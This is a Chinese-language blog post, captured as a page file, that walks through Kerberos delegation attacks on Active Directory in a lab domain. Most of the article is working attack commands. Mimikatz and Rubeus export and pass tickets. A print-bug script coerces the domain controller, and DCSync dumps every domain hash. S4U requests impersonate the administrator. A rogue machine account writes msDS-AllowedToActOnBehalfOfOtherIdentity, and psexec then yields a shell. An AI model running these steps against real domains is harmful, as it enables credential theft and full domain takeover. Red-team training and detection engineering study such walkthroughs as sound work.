@@ -1,0 +1,565 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/icon.png">
+  <link rel="icon" href="/img/icon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="前言域委派是指将域内用户的权限委派给服务账号，使得服务账号能以用户的权限在域内展开活动
+委派主要分为非约束委派(Unconstrained delegation)和约束委派(Constrained delegation)两个方式，还有一种是基于资源的约束委派(Resource Based Constrained Delegation)">
+  <meta name="author" content="Errorecho">
+  <meta name="keywords" content="">
+  <meta name="description" content="前言域委派是指将域内用户的权限委派给服务账号，使得服务账号能以用户的权限在域内展开活动 委派主要分为非约束委派(Unconstrained delegation)和约束委派(Constrained delegation)两个方式，还有一种是基于资源的约束委派(Resource Based Constrained Delegation)">
+<meta property="og:type" content="article">
+<meta property="og:title" content="域渗透之委派">
+<meta property="og:url" content="http://www.errorecho.com/2021/07/01/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B%E5%A7%94%E6%B4%BE/index.html">
+<meta property="og:site_name" content="Errorecho">
+<meta property="og:description" content="前言域委派是指将域内用户的权限委派给服务账号，使得服务账号能以用户的权限在域内展开活动 委派主要分为非约束委派(Unconstrained delegation)和约束委派(Constrained delegation)两个方式，还有一种是基于资源的约束委派(Resource Based Constrained Delegation)">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://www.errorecho.com/images/1631087005474.png">
+<meta property="og:image" content="http://www.errorecho.com/images/1631171984639.png">
+<meta property="og:image" content="http://www.errorecho.com/images/30.png">
+<meta property="og:image" content="http://www.errorecho.com/images/31.png">
+<meta property="og:image" content="http://www.errorecho.com/images/33.png">
+<meta property="og:image" content="http://www.errorecho.com/images/34.png">
+<meta property="og:image" content="http://www.errorecho.com/images/35.png">
+<meta property="og:image" content="http://www.errorecho.com/images/36.png">
+<meta property="og:image" content="http://www.errorecho.com/images/37.png">
+<meta property="og:image" content="http://www.errorecho.com/images/39.png">
+<meta property="og:image" content="http://www.errorecho.com/images/40.png">
+<meta property="og:image" content="http://www.errorecho.com/images/41.png">
+<meta property="og:image" content="http://www.errorecho.com/images/42.png">
+<meta property="og:image" content="http://www.errorecho.com/images/61.png">
+<meta property="og:image" content="http://www.errorecho.com/images/62.png">
+<meta property="og:image" content="http://www.errorecho.com/images/63.png">
+<meta property="og:image" content="http://www.errorecho.com/images/65.png">
+<meta property="og:image" content="http://www.errorecho.com/images/64.png">
+<meta property="article:published_time" content="2021-07-01T05:16:06.000Z">
+<meta property="article:modified_time" content="2021-12-15T03:31:30.762Z">
+<meta property="article:author" content="Errorecho">
+<meta property="article:tag" content="委派">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://www.errorecho.com/images/1631087005474.png">
+  
+  <title>域渗透之委派 - Errorecho</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"www.errorecho.com","root":"/","version":"1.8.12","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname"}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Errorecho&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                主页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                文章
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                类别
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/1.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="域渗透之委派">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-07-01 13:16" pubdate>
+        July 1, 2021 pm
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      4.6k 字
+    </span>
+  
+
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      14 分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">域渗透之委派</h1>
+            
+            <div class="markdown-body">
+              <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>域委派是指将域内用户的权限委派给服务账号，使得服务账号能以用户的权限在域内展开活动</p>
+<p>委派主要分为非约束委派(Unconstrained delegation)和约束委派(Constrained delegation)两个方式，还有一种是基于资源的约束委派(Resource Based Constrained Delegation)</p>
+<span id="more"></span>
+<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>本文主要讲述以下内容：</p>
+<ul>
+<li>非约束委派的利用</li>
+<li>约束委派的利用</li>
+<li>基于资源的约束委派的利用</li>
+</ul>
+<h1 id="什么是委派"><a href="#什么是委派" class="headerlink" title="什么是委派"></a>什么是委派</h1><p>Kerberos 委派是指将域内用户的权限委派给服务账号，使得服务账号能以用户的权限在域内展开活动。</p>
+<p>假设用户A访问了服务B，服务B利用A的身份去请求服务C，这个身份借派的过程可以理解为委派。</p>
+<h1 id="非约束委派"><a href="#非约束委派" class="headerlink" title="非约束委派"></a>非约束委派</h1><p>假如server1主机账户配置了非约束委派，那么域账户A在对server1主机账户旗下服务service1（例如cifs服务）产生kerberos认证的时候（例如dir \server1\c$）域账户会发送包含tgt的tgs给service1，然后service1就可以代表域账户A认证域内任何服务器。</p>
+<p><img src="/images/1631087005474.png" srcset="/img/loading.gif" lazyload alt="1631087005474.png"></p>
+<h2 id="认证流程"><a href="#认证流程" class="headerlink" title="认证流程"></a>认证流程</h2><ol>
+<li>用户通过发送KRB_AS_REQ消息请求可转发 TGT（forwardable TGT，为了方便我们称为TGT1）</li>
+<li>KDC在KRB_AS_REP消息中返回TGT1</li>
+<li>用户再通过TGT1向KDC请求转发TGT（forwardedTGT，我们称为TGT2）</li>
+<li>在KRB_TGS_REP消息中返回转发TGT2</li>
+<li>用户使用TGT1向KDC申请访问Service1的ST（ServiceTicket）</li>
+<li>TGS返回给用户一个ST  </li>
+<li>用户发送KRB_AP_REQ请求至Service1，这个请求中包含了TGT1和ST、TGT2、TGT2的SessionKey</li>
+<li>Service1使用用户的TGT2通过KRB_TGS_REQ发送给KDC，以用户的名义请求能够访问Service2的票据</li>
+<li>KDC在KRB_TGS_REP消息中返回Service2到Service1的票据</li>
+<li>Service1以用户的名义向Service2发送KRB_AP_REQ请求</li>
+<li>Service2响应步骤10中Service1的请求</li>
+<li>Service1响应步骤7中用户的请求</li>
+<li>在这个过程中的TGT转发机制，没有限制Service1对TGT2的使用，也就是说Service1可以通过TGT2来请求任意服务</li>
+<li>KDC返回步骤13中请求的票据，15和16即为Service1通过模拟用户来访问其他Service</li>
+<li>然后，服务1可以冒充用户访问服务N。</li>
+<li>服务N将响应服务1，就如同响应用户访问一样。</li>
+</ol>
+<p>协议层面讲，用户委派service1访问service2服务，那么用户会将TGT缓存在service1的lsass中，DM再模拟这个用户去访问服务。</p>
+<h2 id="设置非约束委派"><a href="#设置非约束委派" class="headerlink" title="设置非约束委派"></a>设置非约束委派</h2><p><img src="/images/1631171984639.png" srcset="/img/loading.gif" lazyload alt="1631171984639.png"></p>
+<h2 id="查找非约束委派账户"><a href="#查找非约束委派账户" class="headerlink" title="查找非约束委派账户"></a>查找非约束委派账户</h2><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">AdFind.exe</span> -<span class="hljs-keyword">b</span> <span class="hljs-string">&quot;DC=god,DC=org&quot;</span> -f <span class="hljs-string">&quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;</span> <span class="hljs-meta">cn</span> distinguishedName<br></code></pre></td></tr></table></figure>
+<h2 id="查找非约束委派计算机"><a href="#查找非约束委派计算机" class="headerlink" title="查找非约束委派计算机"></a>查找非约束委派计算机</h2><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">AdFind.exe</span> -<span class="hljs-keyword">b</span> <span class="hljs-string">&quot;DC=god,DC=org&quot;</span> -f <span class="hljs-string">&quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;</span> <span class="hljs-meta">cn</span> distinguishedName<br></code></pre></td></tr></table></figure>
+
+<h2 id="针对非约束委派计算机"><a href="#针对非约束委派计算机" class="headerlink" title="针对非约束委派计算机"></a>针对非约束委派计算机</h2><p>域控访问非约束委派计算机</p>
+<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-built_in">Enter</span><span class="hljs-operator">-</span><span class="hljs-variable">PSSession</span> <span class="hljs-operator">-</span><span class="hljs-variable">ComputerName</span> 指定主机名 访问<span class="hljs-variable">winrm</span>服务<br></code></pre></td></tr></table></figure>
+<p>非约束委派计算机<br>mimikatz导出票据</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">privilege::debug<br>sekurlsa::ticket /<span class="hljs-keyword">export</span><br></code></pre></td></tr></table></figure>
+<p><img src="/images/30.png" srcset="/img/loading.gif" lazyload></p>
+<p>导入票据</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">mimikatz</span> <span class="hljs-string">&quot;kerberos::ptt xxx.kiribi&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>可以成功访问其他主机</p>
+<p><img src="/images/31.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="Print-Bug"><a href="#Print-Bug" class="headerlink" title="Print Bug"></a>Print Bug</h2><p>Rubeus开启监听</p>
+<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali">Rubeus.exe<span class="hljs-built_in"> monitor </span>/interval:1 /filteruser:dc2012$<br></code></pre></td></tr></table></figure>
+<p><img src="/images/33.png" srcset="/img/loading.gif" lazyload></p>
+<p>printbug.py<br>强制域控访问本机</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python</span> printbug.py doo/user<span class="hljs-number">2</span>:whoami+<span class="hljs-number">123</span>@dc<span class="hljs-number">2012</span> dmwin<span class="hljs-number">10</span><br></code></pre></td></tr></table></figure>
+<p><img src="/images/34.png" srcset="/img/loading.gif" lazyload></p>
+<p>Rubeus收到base64加密的票据<br><img src="/images/35.png" srcset="/img/loading.gif" lazyload></p>
+<p>解密票据</p>
+<figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clojure">[IO.File]<span class="hljs-symbol">::WriteAllBytes</span>(<span class="hljs-string">&quot;ticket.kirbi&quot;</span>, [Convert]<span class="hljs-symbol">::FromBase64String</span>(<span class="hljs-string">&quot;...&quot;</span>))<br></code></pre></td></tr></table></figure>
+<p><img src="/images/36.png" srcset="/img/loading.gif" lazyload></p>
+<p>mimikatz导入票据，抓取域控HASH</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">kerberos:<span class="hljs-function">:ptt</span> tickets.kirbi<br>lsadump:<span class="hljs-function">:dcsync</span> <span class="hljs-string">/domain</span><span class="hljs-function">:doo.com</span> <span class="hljs-string">/all</span> <span class="hljs-string">/csv</span><br></code></pre></td></tr></table></figure>
+<p><img src="/images/37.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="约束委派"><a href="#约束委派" class="headerlink" title="约束委派"></a>约束委派</h1><p>查找约束委派的机器</p>
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">AdFind.exe</span> -<span class="hljs-keyword">b</span> <span class="hljs-string">&quot;DC=doo,DC=com&quot;</span> -f <span class="hljs-string">&quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot;</span> <span class="hljs-meta">cn</span> distinguishedName msds-allowedtodelegateto<br></code></pre></td></tr></table></figure>
+<p>查找约束委派的账户</p>
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">AdFind.exe</span> -<span class="hljs-keyword">b</span> <span class="hljs-string">&quot;DC=doo,DC=com&quot;</span> -f <span class="hljs-string">&quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot;</span> <span class="hljs-meta">cn</span> distinguishedName msds-allowedtodelegateto<br></code></pre></td></tr></table></figure>
+
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>实验环境：</p>
+<ul>
+<li>DC：dc2012.doo.com</li>
+<li>DM：dmwin10.doo.com</li>
+<li>DM: dmwin7.doo.com</li>
+</ul>
+<p>在DC设置dmwin10的委派信任</p>
+<p><img src="/images/39.png" srcset="/img/loading.gif" lazyload></p>
+<p>1、使用kekeo/Rubeus进行认证服务器交换获取票据授予票据TGT。</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Rubeus</span>.exe asktgt /user:dmwin<span class="hljs-number">10</span>$ /rc<span class="hljs-number">4</span>:f<span class="hljs-number">281</span>c<span class="hljs-number">33</span>cfc<span class="hljs-number">1673</span>d<span class="hljs-number">021</span>df<span class="hljs-number">25553</span>e<span class="hljs-number">379705</span> /outfile:tgt.kirbi<br><br><span class="hljs-attribute">kekeo</span>.exe <span class="hljs-string">&quot;tgt::ask /user:dmwin10$ /domain:doo.com /ntlm:f281c33cfc1673d021df25553e379705&quot;</span> <span class="hljs-string">&quot;exit&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/40.png" srcset="/img/loading.gif" lazyload></p>
+<p>2、通过约束委派机器账户dmwin10$的TGT来伪造S4U请求，以doo\administrator 的用户身份请求访问 cifs/dmwin7</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">kekeo<span class="hljs-selector-class">.exe</span> tgs::s4u /tgt:TGT_dmwin10$@DOO.COM_krbtgt~doo.com@DOO<span class="hljs-selector-class">.COM</span><span class="hljs-selector-class">.kirbi</span> /user:administrator@doo<span class="hljs-selector-class">.com</span> /service:cifs/dmwin7<span class="hljs-selector-class">.doo</span>.com<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/41.png" srcset="/img/loading.gif" lazyload></p>
+<p>3、通过mimikatz/Rubeus导入用于访问cifs/dmwin7.doo.com的TGS即可：</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl">mimikatz.exe <span class="hljs-string">&quot;kerberos::ptt TGS_administrator@doo.com@DOO.COM_cifs~dmwin7.doo.com@DOO.COM.kirbi&quot;</span> <span class="hljs-string">&quot;exit&quot;</span><br>Rubeus.exe ptt /ticket:TGS_administrator@doo.com@DOO.COM_cifs~dmwin7.doo.com@DOO.COM.kirbi<br></code></pre></td></tr></table></figure>
+<p>可以查看dmwin7.doo.com的文件<br><img src="/images/42.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="基于资源的约束委派"><a href="#基于资源的约束委派" class="headerlink" title="基于资源的约束委派"></a>基于资源的约束委派</h1><p>寻找对目标主机账户有完全控制权限的用户</p>
+<figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs subunit">Get-DomainUser -Identity user2 -Properties objectsid<br>Get-DomainObjectAcl -Identity dmwin7 | ?&#123;$_.SecurityIdentifier -match &quot;S<span class="hljs-string">-1</span><span class="hljs-string">-5</span><span class="hljs-string">-21</span><span class="hljs-string">-1400798338</span><span class="hljs-string">-111303069</span><span class="hljs-string">-2475645031</span><span class="hljs-string">-1107</span>&quot;&#125;<br></code></pre></td></tr></table></figure>
+<p><img src="/images/61.png" srcset="/img/loading.gif" lazyload></p>
+<p>创建机器账户</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Import-Module</span> .\Powermad.ps1<br><span class="hljs-built_in">New-MachineAccount</span> <span class="hljs-literal">-MachineAccount</span> evilsystem <span class="hljs-literal">-Password</span> <span class="hljs-variable">$</span>(<span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-string">&quot;evilsystem&quot;</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span>)<br></code></pre></td></tr></table></figure>
+<p><img src="/images/62.png" srcset="/img/loading.gif" lazyload></p>
+<p>修改dmwin10的msDS-AllowedToActOnBehalfOfOtherIdentity属性的值</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 这里的 sid -&gt; S-1-5-21-1400798338-111303069-2475645031-1108</span><br><span class="hljs-comment"># 是我们创建的 机器用户 evilsystem 的 sid，在 powerview 下用</span><br><span class="hljs-built_in">Get-DomianComputer</span> hacksystem<br><span class="hljs-comment"># 获取</span><br><br><span class="hljs-variable">$SD</span> = <span class="hljs-built_in">New-Object</span> Security.AccessControl.RawSecurityDescriptor <span class="hljs-literal">-ArgumentList</span> <span class="hljs-string">&quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1400798338-111303069-2475645031-1108)&quot;</span><br><br><span class="hljs-variable">$SDBytes</span> = <span class="hljs-built_in">New-Object</span> byte[] (<span class="hljs-variable">$SD</span>.BinaryLength)<br><br><span class="hljs-variable">$SD</span>.GetBinaryForm(<span class="hljs-variable">$SDBytes</span>, <span class="hljs-number">0</span>)<br><br><span class="hljs-built_in">Get-DomainComputer</span> dmwin7| <span class="hljs-built_in">Set-DomainObject</span> <span class="hljs-literal">-Set</span> <span class="hljs-selector-tag">@</span>&#123;<span class="hljs-string">&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;</span>=<span class="hljs-variable">$SDBytes</span>&#125; <span class="hljs-literal">-Verbose</span><br><br></code></pre></td></tr></table></figure>
+<p><img src="/images/63.png" srcset="/img/loading.gif" lazyload></p>
+<p>利用</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Rubeus</span>.exe hash /user:evilsystem /password:evilsystem /domain:doo.com<br><br><span class="hljs-attribute">Rubeus</span>.exe s<span class="hljs-number">4</span>u /user:evilsystem$ /rc<span class="hljs-number">4</span>:<span class="hljs-number">59</span>E<span class="hljs-number">88</span>FF<span class="hljs-number">5460</span>CD<span class="hljs-number">39</span>F<span class="hljs-number">0</span>FE<span class="hljs-number">4</span>A<span class="hljs-number">9</span>FC<span class="hljs-number">17</span>DAD<span class="hljs-number">53</span>B /impersonateuser:administrator /msdsspn:cifs/dmwin<span class="hljs-number">7</span>.doo.com /ptt<br><span class="hljs-attribute">Rubeus</span>.exe s<span class="hljs-number">4</span>u /user:evilsystem$ /rc<span class="hljs-number">4</span>:<span class="hljs-number">59</span>E<span class="hljs-number">88</span>FF<span class="hljs-number">5460</span>CD<span class="hljs-number">39</span>F<span class="hljs-number">0</span>FE<span class="hljs-number">4</span>A<span class="hljs-number">9</span>FC<span class="hljs-number">17</span>DAD<span class="hljs-number">53</span>B /impersonateuser:administrator /msdsspn:host/dmwin<span class="hljs-number">7</span>.doo.com /ptt<br></code></pre></td></tr></table></figure>
+<p><img src="/images/65.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vim">getST_windows.<span class="hljs-keyword">exe</span> -dc-ip <span class="hljs-number">10.10</span>.<span class="hljs-number">10.10</span> -spn cifs/dmwin7.doo.<span class="hljs-keyword">com</span> -impersonate administrator doo.<span class="hljs-keyword">com</span>/evilsystem$:evilsystem<br><br><span class="hljs-keyword">set</span> KRB5CCNAME=administrator.ccache<br><br>psexec.<span class="hljs-keyword">exe</span> -<span class="hljs-keyword">no</span>-pass -<span class="hljs-keyword">k</span> dmwin7.doo.<span class="hljs-keyword">com</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/64.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>本文主要讲述了三种委派方式的原理，并给出了实战利用示例</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E5%9F%9F%E6%B8%97%E9%80%8F/">域渗透</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E5%A7%94%E6%B4%BE/">委派</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/07/07/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8BNTDS/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">域渗透之NTDS</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/06/26/Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/">
+                        <span class="hidden-mobile">Java反射机制</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://github.com/errorecho" target="_blank" rel="nofollow noopener"><span>Github</span></a> <i class="iconfont icon-love"></i> <a href="https://www.errorecho.com" target="_blank" rel="nofollow noopener"><span>Blog</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
